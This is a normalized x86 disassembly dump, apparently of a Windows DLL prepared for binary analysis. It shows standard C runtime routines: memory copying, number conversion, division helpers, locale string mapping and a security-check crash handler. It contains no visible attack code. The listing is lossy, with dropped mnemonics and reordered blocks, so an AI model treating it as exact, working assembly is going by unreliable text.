jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_100269c8 ]
jmp [ ecx * 4 + jump_table_10026a48 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10026ab4 ]
pop esi
pop edi
pop ebp
jmp sub_10030453
jmp [ ecx * 4 + jump_table_10026c50 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10026b54 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10026c50 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10026ab4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10026c50 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10026ab4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10026ab4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10026ab4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10026c50 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10026c50 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10026c50 ]
sub_10026ca5
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_10022f32
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_10026cea
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10030536
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10026d36
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10030654
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_10026d84
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003086f
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10026dd6
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_10026065
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_10026065
push 0x16
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_10026065
push 0x22
jmp r-xdata
pop edi
mov [ ebp - 0x4 ] ebx
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
mov edi ecx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] edx
jb r-xdata
mov [ ecx ] dl
inc ecx
inc [ ebp - 0x4 ]
xor ebx ebx
cmp eax ebx
jbe r-xdata
mov [ ecx ] bl
dec ecx
mov [ esi ] bl
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_10026eb3
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_10026dd6
pop ebp
retn
sub_10026edd
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
cmp edi ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
call sub_10026065
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ebx
mov [ edi ] bl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
pop ebx
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_10026065
push 0x22
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov esi edi
cmp [ ebp + 0x18 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ebx
neg edx
adc eax ebx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test edx edx
jbe r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push edx
call sub_100308f0
mov [ ebp - 0x8 ] ebx
mov ebx edx
mov edx eax
mov eax ebx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_10026065
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
sub_10026fd5
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10026edd
pop edi
pop ebp
retn
sub_10026ff4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_1002704b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_10023358
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_10026065
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10030985
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_1002d3c5
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_100268cc
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10027160
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002704b
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_10027190
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10027200
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_100272b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
mov esi ebx
call sub_10023358
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_10026065
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020579
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_1002d3c5
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
push esi
call sub_100200e0
pop ecx
push eax
lea eax [ ebp - 0x30 ]
push esi
push eax
call sub_10031540
add esp 0x18
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x8 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x8 ]
fldz
fcom [ ecx + 0x10 ]
fnstsw ax
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x8 ]
call sub_10026065
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_100273ed
push 0xc
push r--data
call sub_10028b48
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
cmp edi esi
setne al
cmp eax esi
je r-xdata
call sub_10026065
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10020579
add esp 0x14
xor eax eax
cmp [ edi ] si
setne al
cmp eax esi
je r-xdata
call sub_10028b8d
retn
call sub_1002c2c7
mov [ ebp + 0x8 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
cmp [ ebx ] si
jne r-xdata
call sub_10026065
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push edi
push ebx
call sub_100315e7
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100274a9
mov eax [ ebp - 0x1c ]
call sub_10026065
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_1002c400
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_100274c0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10027570
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1002759b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
call sub_1003189b
mov esi [ eax ]
call sub_1003189b
cmp esi [ eax ]
jl r-xdata
call sub_100318a1
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_100275c3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_10027e0b
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_1002759b
push eax
push edi
push esi
call sub_1002776c
add esp 0x10
test eax eax
je r-xdata
push 0x1
push edi
call sub_10026cea
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
mov eax r--data
jmp r-xdata
pop edi
sub_1002762f
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_10027bb5
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_10027bb5
pop ecx
sub_10027744
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_10027c38
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1002776c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_10026065
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_10026065
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
sub_100277d4
push 0xc
push r--data
call sub_10028b48
push 0xe
call sub_10028f4e
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002783b
call sub_10028b8d
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_100207fd
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_100207fd
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_10027850
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_100278d8 ]
jmp [ ecx * 4 + jump_table_10027958 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100279c4 ]
pop esi
pop edi
pop ebp
jmp sub_10030453
jmp [ ecx * 4 + jump_table_10027b60 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10027a64 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10027b60 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100279c4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
